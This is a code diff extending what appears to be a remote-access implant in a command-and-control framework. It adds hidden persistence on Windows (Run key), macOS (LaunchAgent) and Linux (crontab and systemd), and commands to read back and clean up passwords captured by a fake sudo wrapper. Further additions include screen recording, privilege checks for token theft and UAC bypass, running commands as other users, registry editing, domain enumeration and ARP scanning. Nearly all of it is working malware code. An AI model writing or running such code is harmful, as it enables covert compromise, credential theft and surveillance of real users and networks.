@@ -56,6 +56,9 @@ _web_apps:    dict[int, object]           = {}
 
 _timelapse_stop = threading.Event()
 
+# Beacon sleep interval — 0 means no sleep between command polls (legacy behaviour)
+_beacon_sleep: float = 0.0
+
 
 # ---------------------------------------------------------------------------
 # Command router
@@ -384,24 +387,138 @@ def _stop_web(port: int) -> str:
 
 @_register("persist")
 def _persist(conn, args: list[str]) -> str:
-    if sys.platform != "win32":
-        return "[-] Persistence is Windows-only"
+    """
+    Install persistence for the agent.
+    Windows: copies agent to AppData and adds a Run registry key.
+    Linux:   installs a user crontab entry and a systemd user service unit.
+    macOS:   installs a ~/Library/LaunchAgents plist.
+    Usage: persist <regname> <filename>
+    """
     if len(args) != 2:
         return "Usage: persist <regname> <filename>"
     reg_name, copy_name = args[0], args[1]
+
+    # ── Windows ───────────────────────────────────────────────────────────────
+    if sys.platform == "win32":
+        try:
+            dst = os.path.join(os.environ["APPDATA"], copy_name)
+            if not os.path.exists(dst):
+                shutil.copyfile(sys.executable, dst)
+                subprocess.call(
+                    f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
+                    f'/v {reg_name} /t REG_SZ /d "{dst}"',
+                    shell=True,
+                )
+                return "[+] Persistence installed (Windows registry Run key)"
+            return "[-] Already exists"
+        except Exception as e:
+            return f"[-] Error: {e}"
+
+    # ── macOS ─────────────────────────────────────────────────────────────────
+    if sys.platform == "darwin":
+        try:
+            agent_src = os.path.abspath(sys.argv[0]) if sys.argv else sys.executable
+            launch_agents = os.path.expanduser("~/Library/LaunchAgents")
+            os.makedirs(launch_agents, exist_ok=True)
+            plist_path = os.path.join(launch_agents, f"com.{reg_name}.plist")
+            if os.path.exists(plist_path):
+                return f"[-] LaunchAgent already exists: {plist_path}"
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.{reg_name}</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{sys.executable}</string>
+        <string>{agent_src}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>StandardOutPath</key>
+    <string>/dev/null</string>
+    <key>StandardErrorPath</key>
+    <string>/dev/null</string>
+</dict>
+</plist>
+"""
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+            subprocess.call(["launchctl", "load", "-w", plist_path],
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return f"[+] Persistence installed (macOS LaunchAgent: {plist_path})"
+        except Exception as e:
+            return f"[-] macOS persistence error: {e}"
+
+    # ── Linux ─────────────────────────────────────────────────────────────────
+    messages: list[str] = []
+    agent_src = os.path.abspath(sys.argv[0]) if sys.argv else sys.executable
+    dst_bin   = os.path.expanduser(f"~/.local/bin/{copy_name}")
+
+    # Copy agent binary to a hidden location
     try:
-        dst = os.path.join(os.environ["APPDATA"], copy_name)
-        if not os.path.exists(dst):
-            shutil.copyfile(sys.executable, dst)
-            subprocess.call(
-                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
-                f'/v {reg_name} /t REG_SZ /d "{dst}"',
-                shell=True,
-            )
-            return "[+] Persistence installed"
-        return "[-] Already exists"
+        os.makedirs(os.path.dirname(dst_bin), exist_ok=True)
+        shutil.copyfile(sys.executable, dst_bin)
+        os.chmod(dst_bin, 0o755)
     except Exception as e:
-        return f"[-] Error: {e}"
+        messages.append(f"[-] Could not copy agent: {e}")
+        dst_bin = sys.executable  # fallback: reference the running executable
+
+    # Technique 1: crontab @reboot entry
+    try:
+        import tempfile as _tmp
+        cron_entry = f"@reboot {sys.executable} {agent_src} >/dev/null 2>&1\n"
+        existing = subprocess.check_output(["crontab", "-l"],
+                                           stderr=subprocess.DEVNULL).decode()
+        if agent_src not in existing:
+            with _tmp.NamedTemporaryFile(mode="w", suffix=".cron", delete=False) as tf:
+                tf.write(existing.rstrip("\n") + "\n" + cron_entry)
+                tf_path = tf.name
+            subprocess.check_call(["crontab", tf_path], stdout=subprocess.DEVNULL,
+                                   stderr=subprocess.DEVNULL)
+            os.unlink(tf_path)
+            messages.append("[+] Crontab @reboot entry added")
+        else:
+            messages.append("[*] Crontab entry already present")
+    except Exception as e:
+        messages.append(f"[-] Crontab failed: {e}")
+
+    # Technique 2: systemd user service unit
+    try:
+        svc_dir = os.path.expanduser("~/.config/systemd/user")
+        os.makedirs(svc_dir, exist_ok=True)
+        unit_path = os.path.join(svc_dir, f"{reg_name}.service")
+        if not os.path.exists(unit_path):
+            unit_content = f"""[Unit]
+Description={reg_name}
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={sys.executable} {agent_src}
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=default.target
+"""
+            with open(unit_path, "w") as f:
+                f.write(unit_content)
+            subprocess.call(["systemctl", "--user", "daemon-reload"],
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.call(["systemctl", "--user", "enable", "--now", f"{reg_name}.service"],
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            messages.append(f"[+] systemd user service installed: {unit_path}")
+        else:
+            messages.append(f"[*] systemd unit already exists: {unit_path}")
+    except Exception as e:
+        messages.append(f"[-] systemd failed: {e}")
+
+    return "\n".join(messages) if messages else "[-] No persistence methods succeeded"
 
 
 @_register("keylog_start")
@@ -1812,6 +1929,12 @@ def _getsystem(conn, args: list[str]) -> str:
       1. sudo -l  — check for passwordless sudo rules
       2. SUID binary sweep
     """
+    # Windows pre-flight (only on Windows — on Linux we continue and check sudo)
+    if sys.platform == "win32":
+        priv_err = _windows_privcheck()
+        if priv_err:
+            return priv_err + "\n[*] getsystem will attempt techniques anyway…"
+
     if sys.platform != "win32":
         # Linux: passwordless sudo check
         for candidate in ("sudo -l", "pkexec --version"):
@@ -2421,6 +2544,75 @@ def _lock_screen(conn, args: list[str]) -> str:
 # Token / credential theft — Windows impersonation token steal
 # ---------------------------------------------------------------------------
 
+# ---------------------------------------------------------------------------
+# Windows privilege pre-flight helper (shared by token ops and uac_bypass)
+# ---------------------------------------------------------------------------
+
+def _windows_privcheck() -> str | None:
+    """
+    Quick privilege probe for Windows token operations.
+    Returns None if the caller appears to have sufficient rights,
+    or a descriptive error string if they do not.
+    """
+    if sys.platform != "win32":
+        return "[-] Windows-only operation"
+    try:
+        import ctypes
+        import ctypes.wintypes as wt
+
+        # Check for admin group membership
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+        if not is_admin:
+            # Also check for SeDebugPrivilege explicitly
+            TOKEN_QUERY    = 0x0008
+            TOKEN_ALL_ACCESS = 0xF01FF
+            advapi32 = ctypes.windll.advapi32
+            kernel32 = ctypes.windll.kernel32
+
+            h_token = wt.HANDLE()
+            h_proc  = kernel32.GetCurrentProcess()
+            if not advapi32.OpenProcessToken(h_proc, TOKEN_QUERY, ctypes.byref(h_token)):
+                return "[-] Privilege check: OpenProcessToken failed — likely no admin rights"
+
+            class LUID(ctypes.Structure):
+                _fields_ = [("LowPart", wt.DWORD), ("HighPart", ctypes.c_long)]
+
+            luid = LUID()
+            if not advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid)):
+                ctypes.windll.kernel32.CloseHandle(h_token)
+                return "[-] Privilege check: LookupPrivilegeValue failed"
+
+            # A simple heuristic: try to open winlogon (PID 4 is SYSTEM on Win but not always)
+            # We probe by attempting a no-access open on a SYSTEM process
+            import subprocess as _sp
+            try:
+                raw = _sp.check_output(
+                    ["tasklist", "/FI", "IMAGENAME eq winlogon.exe", "/FO", "CSV", "/NH"],
+                    text=True, stderr=_sp.DEVNULL
+                )
+                rows = [r for r in raw.splitlines() if r.strip()]
+                if rows:
+                    parts = rows[0].strip('"').split('","')
+                    test_pid = int(parts[1]) if len(parts) > 1 else 0
+                    if test_pid:
+                        PROCESS_QUERY_LIMITED = 0x1000
+                        h = ctypes.windll.kernel32.OpenProcess(PROCESS_QUERY_LIMITED, False, test_pid)
+                        if not h:
+                            ctypes.windll.kernel32.CloseHandle(h_token)
+                            return (
+                                "[-] Privilege check: Cannot open SYSTEM process — "
+                                "SeDebugPrivilege not held. Run as administrator."
+                            )
+                        ctypes.windll.kernel32.CloseHandle(h)
+            except Exception:
+                pass
+
+            ctypes.windll.kernel32.CloseHandle(h_token)
+    except Exception as e:
+        return f"[-] Privilege check failed: {e}"
+    return None  # looks OK
+
+
 @_register("token_steal")
 def _token_steal(conn, args: list[str]) -> str:
     """
@@ -2430,6 +2622,9 @@ def _token_steal(conn, args: list[str]) -> str:
     """
     if sys.platform != "win32":
         return "[-] token_steal is Windows-only"
+    priv_err = _windows_privcheck()
+    if priv_err:
+        return priv_err
     try:
         import ctypes
         import ctypes.wintypes as wt
@@ -2729,6 +2924,9 @@ def _uac_bypass(conn, args: list[str]) -> str:
         return "[-] uac_bypass is Windows-only"
     if not args:
         return "Usage: uac_bypass <command>"
+    priv_err = _windows_privcheck()
+    if priv_err:
+        return priv_err
     payload = " ".join(args)
     try:
         import winreg
@@ -2885,9 +3083,71 @@ echo "$PW" >> {log_path}
         os.chmod(fake_sudo, 0o755)
         return (f"[+] Fake sudo installed at {fake_sudo}\n"
                 f"    Passwords will be captured to {log_path}\n"
-                f"    Retrieve with: download {log_path}")
+                f"    Retrieve with: sudo_sniff_read  (or  download {log_path})")
     except Exception as e:
         return f"[-] sudo_sniff: {e}"
+
+
+@_register("sudo_sniff_read")
+def _sudo_sniff_read(conn, args: list[str]) -> str:
+    """
+    Read back passwords captured by sudo_sniff.
+    Usage: sudo_sniff_read [log_path]
+    Default log_path: /tmp/.ssniff
+    """
+    if sys.platform == "win32":
+        return "[-] sudo_sniff_read is Unix-only"
+    log_path = args[0] if args else "/tmp/.ssniff"
+    if not os.path.isfile(log_path):
+        return f"[-] Log not found: {log_path}  (has anyone used sudo since planting?)"
+    try:
+        with open(log_path, "r", errors="replace") as f:
+            content = f.read().strip()
+        return content if content else "(no passwords captured yet)"
+    except PermissionError:
+        return f"[-] Permission denied reading: {log_path}"
+    except Exception as e:
+        return f"[-] sudo_sniff_read: {e}"
+
+
+@_register("sudo_sniff_clean")
+def _sudo_sniff_clean(conn, args: list[str]) -> str:
+    """
+    Remove the fake sudo wrapper and its log file.
+    Usage: sudo_sniff_clean [log_path]
+    Default log_path: /tmp/.ssniff
+    """
+    if sys.platform == "win32":
+        return "[-] sudo_sniff_clean is Unix-only"
+    log_path = args[0] if args else "/tmp/.ssniff"
+    messages: list[str] = []
+
+    # Identify and remove fake sudo from PATH dirs
+    real_sudo = shutil.which("sudo") or "/usr/bin/sudo"
+    for d in os.environ.get("PATH", "").split(":"):
+        if not d:
+            continue
+        candidate = os.path.join(d, "sudo")
+        if candidate == real_sudo:
+            break
+        if os.path.isfile(candidate):
+            try:
+                os.remove(candidate)
+                messages.append(f"[+] Removed fake sudo: {candidate}")
+            except Exception as e:
+                messages.append(f"[-] Could not remove {candidate}: {e}")
+
+    # Remove the log file
+    if os.path.isfile(log_path):
+        try:
+            os.remove(log_path)
+            messages.append(f"[+] Removed log: {log_path}")
+        except Exception as e:
+            messages.append(f"[-] Could not remove log {log_path}: {e}")
+    else:
+        messages.append(f"[*] Log not found (already removed?): {log_path}")
+
+    return "\n".join(messages) if messages else "[-] Nothing to clean"
 
 
 # ---------------------------------------------------------------------------
@@ -3132,10 +3392,70 @@ def _screenrecord(conn, args: list[str]) -> str | None:
         except OSError:
             pass
         return None
-    except ImportError as e:
-        return f"[-] screenrecord requires opencv-python + mss: {e}"
+    except ImportError:
+        pass  # fall through to ffmpeg path
     except Exception as e:
-        return f"[-] screenrecord: {e}"
+        return f"[-] screenrecord (cv2/mss path): {e}"
+
+    # ── ffmpeg fallback ───────────────────────────────────────────────────────
+    if not shutil.which("ffmpeg"):
+        return "[-] screenrecord requires opencv-python+mss OR ffmpeg in PATH"
+    try:
+        out_path = "_screenrec.mp4"
+        if sys.platform == "darwin":
+            # macOS: use avfoundation (screen capture device index 1)
+            cmd = [
+                "ffmpeg", "-y",
+                "-f", "avfoundation", "-framerate", str(fps),
+                "-i", "1:none",
+                "-t", str(seconds),
+                "-vf", f"scale={scale_width}:-2",
+                "-vcodec", "libx264", "-preset", "ultrafast",
+                "-pix_fmt", "yuv420p",
+                out_path,
+            ]
+        elif sys.platform == "win32":
+            # Windows: use gdigrab
+            cmd = [
+                "ffmpeg", "-y",
+                "-f", "gdigrab", "-framerate", str(fps),
+                "-i", "desktop",
+                "-t", str(seconds),
+                "-vf", f"scale={scale_width}:-2",
+                "-vcodec", "libx264", "-preset", "ultrafast",
+                "-pix_fmt", "yuv420p",
+                out_path,
+            ]
+        else:
+            # Linux: try x11grab; fall back to wayland/pipewire via kmsgrab
+            display = os.environ.get("DISPLAY", ":0")
+            cmd = [
+                "ffmpeg", "-y",
+                "-f", "x11grab", "-framerate", str(fps),
+                "-i", display,
+                "-t", str(seconds),
+                "-vf", f"scale={scale_width}:-2",
+                "-vcodec", "libx264", "-preset", "ultrafast",
+                "-pix_fmt", "yuv420p",
+                out_path,
+            ]
+        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                              timeout=seconds + 30)
+        if not os.path.isfile(out_path):
+            return "[-] ffmpeg completed but output file not found"
+        _send_msg(conn, "FILE_OK")
+        _send_file(conn, out_path)
+        try:
+            os.remove(out_path)
+        except OSError:
+            pass
+        return None
+    except subprocess.TimeoutExpired:
+        return "[-] screenrecord (ffmpeg): timed out"
+    except subprocess.CalledProcessError as e:
+        return f"[-] screenrecord (ffmpeg): exited with code {e.returncode}"
+    except Exception as e:
+        return f"[-] screenrecord (ffmpeg): {e}"
 
 
 # ---------------------------------------------------------------------------
@@ -3748,3 +4068,492 @@ def _kiwi(conn, args: list[str]) -> str:
         return _mod.run_kiwi(module, extra_args=extra)
     except Exception as exc:
         return f"[-] kiwi: runner error — {exc}"
+
+
+# ===========================================================================
+# Gaps vs Metasploit — new handlers
+# ===========================================================================
+
+# ---------------------------------------------------------------------------
+# Gap 1 — run_as / execute_process
+# ---------------------------------------------------------------------------
+
+@_register("run_as")
+def _run_as(conn, args: list[str]) -> str:
+    """
+    Run a command as a different user.
+    Windows: uses runas / LogonUser + CreateProcessWithLogonW.
+    Unix:    uses su -c or sudo -u.
+    Usage: run_as <user> <password> <command>
+    """
+    if len(args) < 3:
+        return "Usage: run_as <user> <password> <command>"
+    user, password = args[0], args[1]
+    cmd = " ".join(args[2:])
+
+    if sys.platform == "win32":
+        try:
+            import ctypes, ctypes.wintypes as wt
+            LOGON32_LOGON_INTERACTIVE = 2
+            LOGON32_PROVIDER_DEFAULT  = 0
+            CREATE_NEW_CONSOLE        = 0x10
+            domain = "."
+
+            h_token = wt.HANDLE()
+            ok = ctypes.windll.advapi32.LogonUserW(
+                user, domain, password,
+                LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
+                ctypes.byref(h_token)
+            )
+            if not ok:
+                err_code = ctypes.windll.kernel32.GetLastError()
+                return f"[-] LogonUser failed (error {err_code})"
+
+            # Use CreateProcessWithLogonW to run and capture output via a pipe
+            import tempfile, uuid as _uuid
+            out_path = os.path.join(tempfile.gettempdir(),
+                                    f"_mpl_runas_{_uuid.uuid4().hex[:8]}.txt")
+            full_cmd = f'cmd /c {cmd} > "{out_path}" 2>&1'
+
+            class STARTUPINFOW(ctypes.Structure):
+                _fields_ = [
+                    ("cb",            wt.DWORD), ("lpReserved", wt.LPWSTR),
+                    ("lpDesktop",     wt.LPWSTR), ("lpTitle",   wt.LPWSTR),
+                    ("dwX",           wt.DWORD), ("dwY",        wt.DWORD),
+                    ("dwXSize",       wt.DWORD), ("dwYSize",    wt.DWORD),
+                    ("dwXCountChars", wt.DWORD), ("dwYCountChars", wt.DWORD),
+                    ("dwFillAttribute", wt.DWORD), ("dwFlags",  wt.DWORD),
+                    ("wShowWindow",   wt.WORD),  ("cbReserved2", wt.WORD),
+                    ("lpReserved2",   ctypes.c_char_p),
+                    ("hStdInput",     wt.HANDLE), ("hStdOutput", wt.HANDLE),
+                    ("hStdError",     wt.HANDLE),
+                ]
+
+            class PROCESS_INFORMATION(ctypes.Structure):
+                _fields_ = [
+                    ("hProcess", wt.HANDLE), ("hThread", wt.HANDLE),
+                    ("dwProcessId", wt.DWORD), ("dwThreadId", wt.DWORD),
+                ]
+
+            si = STARTUPINFOW()
+            si.cb = ctypes.sizeof(si)
+            pi = PROCESS_INFORMATION()
+            LOGON_WITH_PROFILE = 1
+
+            created = ctypes.windll.advapi32.CreateProcessWithLogonW(
+                user, domain, password,
+                LOGON_WITH_PROFILE,
+                None, full_cmd,
+                CREATE_NEW_CONSOLE,
+                None, None,
+                ctypes.byref(si), ctypes.byref(pi)
+            )
+            ctypes.windll.kernel32.CloseHandle(h_token)
+
+            if not created:
+                err_code = ctypes.windll.kernel32.GetLastError()
+                return f"[-] CreateProcessWithLogonW failed (error {err_code})"
+
+            # Wait for process to finish (max 30s)
+            ctypes.windll.kernel32.WaitForSingleObject(pi.hProcess, 30000)
+            ctypes.windll.kernel32.CloseHandle(pi.hProcess)
+            ctypes.windll.kernel32.CloseHandle(pi.hThread)
+
+            try:
+                with open(out_path, "r", encoding="utf-8", errors="replace") as fh:
+                    output = fh.read()
+                os.remove(out_path)
+                return output.strip() or "(no output)"
+            except OSError:
+                return "[+] Process finished (no output captured)"
+
+        except Exception as e:
+            return f"[-] run_as: {e}"
+
+    else:
+        # Unix: try sudo -u <user> or su
+        if shutil.which("sudo"):
+            try:
+                proc = subprocess.run(
+                    ["sudo", "-u", user, "-S", "sh", "-c", cmd],
+                    input=password.encode() + b"\n",
+                    capture_output=True, timeout=30
+                )
+                output = (proc.stdout + proc.stderr).decode(errors="replace").strip()
+                return output or f"[+] Command ran as {user} (no output)"
+            except Exception as e:
+                return f"[-] sudo run_as: {e}"
+        # fallback: su -c
+        try:
+            proc = subprocess.run(
+                ["su", "-c", cmd, user],
+                input=password.encode() + b"\n",
+                capture_output=True, timeout=30
+            )
+            return (proc.stdout + proc.stderr).decode(errors="replace").strip() or "(no output)"
+        except Exception as e:
+            return f"[-] su run_as: {e}"
+
+
+@_register("execute")
+def _execute(conn, args: list[str]) -> str:
+    """
+    Execute an arbitrary program and return stdout+stderr.
+    Unlike the shell fallback, this accepts an explicit executable path and
+    separate argument list, which allows running binaries that contain spaces
+    or are not on PATH.
+    Usage: execute <exe> [args...]
+    """
+    if not args:
+        return "Usage: execute <exe> [args...]"
+    try:
+        proc = subprocess.run(
+            args,
+            capture_output=True, timeout=60
+        )
+        output = (proc.stdout + proc.stderr).decode(errors="replace").strip()
+        return output or f"[+] Exit {proc.returncode} (no output)"
+    except FileNotFoundError:
+        return f"[-] Not found: {args[0]}"
+    except subprocess.TimeoutExpired:
+        return "[-] Timed out (60s)"
+    except Exception as e:
+        return f"[-] execute: {e}"
+
+
+# ---------------------------------------------------------------------------
+# Gap 2 — reg command (Windows registry CRUD)
+# ---------------------------------------------------------------------------
+
+@_register("reg")
+def _reg(conn, args: list[str]) -> str:
+    """
+    Read, write, or delete Windows registry keys/values.
+    Usage:
+      reg query  <HIVE\\key>                       — list values
+      reg get    <HIVE\\key> <value_name>           — read one value
+      reg set    <HIVE\\key> <value_name> <REG_type> <data>
+      reg delete <HIVE\\key> [value_name]           — delete value or whole key
+
+    HIVE shortcuts: HKLM, HKCU, HKCR, HKU, HKCC
+    REG_type: REG_SZ, REG_DWORD, REG_QWORD, REG_BINARY, REG_EXPAND_SZ, REG_MULTI_SZ
+    """
+    if sys.platform != "win32":
+        return "[-] reg is Windows-only"
+    if not args:
+        return (
+            "Usage:\n"
+            "  reg query  <HIVE\\\\key>\n"
+            "  reg get    <HIVE\\\\key> <value_name>\n"
+            "  reg set    <HIVE\\\\key> <value_name> <REG_type> <data>\n"
+            "  reg delete <HIVE\\\\key> [value_name]"
+        )
+
+    try:
+        import winreg
+
+        HIVE_MAP = {
+            "HKLM": winreg.HKEY_LOCAL_MACHINE,
+            "HKCU": winreg.HKEY_CURRENT_USER,
+            "HKCR": winreg.HKEY_CLASSES_ROOT,
+            "HKU":  winreg.HKEY_USERS,
+            "HKCC": winreg.HKEY_CURRENT_CONFIG,
+            "HKEY_LOCAL_MACHINE":  winreg.HKEY_LOCAL_MACHINE,
+            "HKEY_CURRENT_USER":   winreg.HKEY_CURRENT_USER,
+            "HKEY_CLASSES_ROOT":   winreg.HKEY_CLASSES_ROOT,
+            "HKEY_USERS":          winreg.HKEY_USERS,
+            "HKEY_CURRENT_CONFIG": winreg.HKEY_CURRENT_CONFIG,
+        }
+
+        TYPE_MAP = {
+            "REG_SZ":        winreg.REG_SZ,
+            "REG_DWORD":     winreg.REG_DWORD,
+            "REG_QWORD":     winreg.REG_QWORD,
+            "REG_BINARY":    winreg.REG_BINARY,
+            "REG_EXPAND_SZ": winreg.REG_EXPAND_SZ,
+            "REG_MULTI_SZ":  winreg.REG_MULTI_SZ,
+        }
+
+        def _split_path(path: str):
+            """Split  HKLM\\Software\\...  into (hive_handle, sub_key)."""
+            parts = path.replace("/", "\\").split("\\", 1)
+            hive_name = parts[0].upper()
+            sub_key   = parts[1] if len(parts) > 1 else ""
+            hive = HIVE_MAP.get(hive_name)
+            if hive is None:
+                raise ValueError(f"Unknown hive: {hive_name}")
+            return hive, sub_key
+
+        subcmd = args[0].lower()
+
+        # ── query ──────────────────────────────────────────────────────────
+        if subcmd == "query":
+            if len(args) < 2:
+                return "Usage: reg query <HIVE\\\\key>"
+            hive, sub = _split_path(args[1])
+            with winreg.OpenKey(hive, sub, access=winreg.KEY_READ) as k:
+                lines = [f"  Key: {args[1]}\n"]
+                i = 0
+                while True:
+                    try:
+                        name, data, dtype = winreg.EnumValue(k, i)
+                        type_name = next((n for n, v in TYPE_MAP.items() if v == dtype),
+                                         str(dtype))
+                        lines.append(f"    {name or '(Default)':<36}  {type_name:<16}  {data!r}")
+                        i += 1
+                    except OSError:
+                        break
+                # Also enumerate subkeys
+                j = 0
+                subkeys = []
+                while True:
+                    try:
+                        subkeys.append(winreg.EnumKey(k, j))
+                        j += 1
+                    except OSError:
+                        break
+                if subkeys:
+                    lines.append(f"\n  Subkeys ({len(subkeys)}):")
+                    for sk in subkeys:
+                        lines.append(f"    {sk}")
+            return "\n".join(lines) if lines else "(no values)"
+
+        # ── get ────────────────────────────────────────────────────────────
+        elif subcmd == "get":
+            if len(args) < 3:
+                return "Usage: reg get <HIVE\\\\key> <value_name>"
+            hive, sub = _split_path(args[1])
+            val_name  = args[2]
+            with winreg.OpenKey(hive, sub, access=winreg.KEY_READ) as k:
+                data, dtype = winreg.QueryValueEx(k, val_name)
+            type_name = next((n for n, v in TYPE_MAP.items() if v == dtype), str(dtype))
+            return f"  {val_name or '(Default)'}  ({type_name})  =  {data!r}"
+
+        # ── set ────────────────────────────────────────────────────────────
+        elif subcmd == "set":
+            if len(args) < 5:
+                return "Usage: reg set <HIVE\\\\key> <value_name> <REG_type> <data>"
+            hive, sub  = _split_path(args[1])
+            val_name   = args[2]
+            type_str   = args[3].upper()
+            raw_data   = " ".join(args[4:])
+            reg_type   = TYPE_MAP.get(type_str)
+            if reg_type is None:
+                return f"[-] Unknown REG type: {type_str}.  Valid: {', '.join(TYPE_MAP)}"
+
+            # Coerce data to the correct Python type
+            if reg_type == winreg.REG_DWORD:
+                data: object = int(raw_data, 0)
+            elif reg_type == winreg.REG_QWORD:
+                data = int(raw_data, 0)
+            elif reg_type == winreg.REG_BINARY:
+                data = bytes.fromhex(raw_data.replace(" ", ""))
+            elif reg_type == winreg.REG_MULTI_SZ:
+                data = raw_data.split("\\0")
+            else:
+                data = raw_data
+
+            with winreg.CreateKeyEx(hive, sub, access=winreg.KEY_SET_VALUE) as k:
+                winreg.SetValueEx(k, val_name, 0, reg_type, data)
+            return f"[+] Wrote {args[1]}\\{val_name} = {data!r}"
+
+        # ── delete ─────────────────────────────────────────────────────────
+        elif subcmd == "delete":
+            if len(args) < 2:
+                return "Usage: reg delete <HIVE\\\\key> [value_name]"
+            hive, sub = _split_path(args[1])
+            if len(args) >= 3:
+                # Delete a specific value
+                val_name = args[2]
+                with winreg.OpenKey(hive, sub, access=winreg.KEY_SET_VALUE) as k:
+                    winreg.DeleteValue(k, val_name)
+                return f"[+] Deleted value: {args[1]}\\{val_name}"
+            else:
+                # Delete the whole key (must be empty of subkeys)
+                winreg.DeleteKey(hive, sub)
+                return f"[+] Deleted key: {args[1]}"
+
+        else:
+            return f"[-] Unknown reg sub-command: {subcmd}.  Use: query / get / set / delete"
+
+    except FileNotFoundError:
+        return f"[-] Key/value not found: {args[1] if len(args) > 1 else '?'}"
+    except PermissionError:
+        return "[-] Access denied — elevation may be required"
+    except Exception as e:
+        return f"[-] reg: {e}"
+
+
+# ---------------------------------------------------------------------------
+# Gap 3 — getdesktop / enumdesktops
+# ---------------------------------------------------------------------------
+
+@_register("getdesktop")
+def _getdesktop(conn, args: list[str]) -> str:
+    """Return the name of the current interactive desktop (Windows)."""
+    if sys.platform != "win32":
+        if sys.platform == "darwin":
+            return _shell_exec("osascript -e 'tell application \"System Events\" to get name of every desktop'")
+        return _shell_exec("echo $DISPLAY && xrandr --query 2>/dev/null | head -5")
+    try:
+        import ctypes
+        buf = ctypes.create_unicode_buffer(256)
+        h = ctypes.windll.user32.GetThreadDesktop(ctypes.windll.kernel32.GetCurrentThreadId())
+        ctypes.windll.user32.GetUserObjectInformationW(h, 2, buf, 512, None)
+        return f"[*] Current desktop: {buf.value}"
+    except Exception as e:
+        return f"[-] getdesktop: {e}"
+
+
+@_register("enumdesktops")
+def _enumdesktops(conn, args: list[str]) -> str:
+    """Enumerate all desktops in the current window station (Windows)."""
+    if sys.platform != "win32":
+        return "[-] enumdesktops is Windows-only"
+    try:
+        import ctypes
+        desktops: list[str] = []
+        DESKTOPENUMPROC = ctypes.WINFUNCTYPE(
+            ctypes.c_bool,
+            ctypes.c_wchar_p,
+            ctypes.c_long
+        )
+
+        def _cb(name, _):
+            desktops.append(name)
+            return True
+
+        h_winsta = ctypes.windll.user32.GetProcessWindowStation()
+        ctypes.windll.user32.EnumDesktopsW(h_winsta, DESKTOPENUMPROC(_cb), 0)
+        if desktops:
+            return "[+] Desktops:\n" + "\n".join(f"  {d}" for d in desktops)
+        return "[-] No desktops enumerated"
+    except Exception as e:
+        return f"[-] enumdesktops: {e}"
+
+
+# ---------------------------------------------------------------------------
+# Gap 10 — net_view / Windows domain enumeration from agent
+# ---------------------------------------------------------------------------
+
+@_register("net_view")
+def _net_view(conn, args: list[str]) -> str:
+    """
+    Enumerate domain computers, shares, and domain controllers visible
+    from the agent.  Works on Windows (net view / nltest) and Linux (smb/ldap).
+    Usage: net_view [domain]
+    """
+    domain = args[0] if args else ""
+    lines: list[str] = []
+
+    if sys.platform == "win32":
+        # List computers visible on the network
+        cmd_view = f"net view /domain:{domain}" if domain else "net view"
+        lines.append("=== Visible computers ===")
+        lines.append(_shell_exec(cmd_view + " 2>&1"))
+
+        # Domain controllers
+        lines.append("\n=== Domain controllers ===")
+        if domain:
+            lines.append(_shell_exec(f"nltest /dclist:{domain} 2>&1"))
+        else:
+            lines.append(_shell_exec("nltest /dclist 2>&1"))
+
+        # Current domain
+        lines.append("\n=== Domain info ===")
+        lines.append(_shell_exec("net config workstation 2>&1 | findstr /i \"domain\\|computer\""))
+
+    else:
+        # Linux: nmblookup / smbclient / ldapsearch
+        lines.append("=== NetBIOS browse ===")
+        if shutil.which("nmblookup"):
+            query = f"-W {domain} '*'" if domain else "'-'"
+            lines.append(_shell_exec(f"nmblookup {query} 2>&1"))
+        elif shutil.which("smbclient"):
+            flag = f"-W {domain}" if domain else ""
+            lines.append(_shell_exec(f"smbclient {flag} -N -L localhost 2>&1"))
+        else:
+            lines.append("[-] nmblookup/smbclient not found")
+
+        lines.append("\n=== Domain controllers (DNS SRV) ===")
+        import socket as _sock
+        try:
+            dm = domain or ""
+            results = _sock.getaddrinfo(f"_ldap._tcp.dc._msdcs.{dm}", None)
+            for r in results:
+                lines.append(f"  {r[4][0]}")
+        except Exception:
+            lines.append("(none found via DNS)")
+
+    return "\n".join(lines)
+
+
+# ---------------------------------------------------------------------------
+# Gap 11 — arp_scan (active ARP scan of subnet from agent)
+# ---------------------------------------------------------------------------
+
+@_register("arp_scan")
+def _arp_scan(conn, args: list[str]) -> str:
+    """
+    Actively ARP-scan a subnet from the agent, discovering live hosts even
+    when ICMP is filtered.
+    Usage: arp_scan <cidr>   e.g. arp_scan 192.168.1.0/24
+
+    Prefers arp-scan (Linux) / arp (Windows) / scapy fallback.
+    """
+    if not args:
+        return "Usage: arp_scan <cidr>"
+    cidr = args[0]
+
+    # Validate CIDR
+    try:
+        import ipaddress
+        network = ipaddress.ip_network(cidr, strict=False)
+    except ValueError as e:
+        return f"[-] Invalid CIDR: {e}"
+
+    # ── Linux: arp-scan tool (most accurate) ──────────────────────────────
+    if sys.platform != "win32" and shutil.which("arp-scan"):
+        return _shell_exec(f"arp-scan --localnet --interface=eth0 {cidr} 2>&1 || "
+                           f"arp-scan --interface=ens33 {cidr} 2>&1 || "
+                           f"arp-scan {cidr} 2>&1")
+
+    # ── Pure-Python: send raw ARP probes via scapy (if available) ─────────
+    try:
+        from scapy.all import ARP, Ether, srp  # type: ignore[import]
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),
+                     timeout=2, verbose=False)
+        if not ans:
+            return f"[-] No ARP responses in {cidr}"
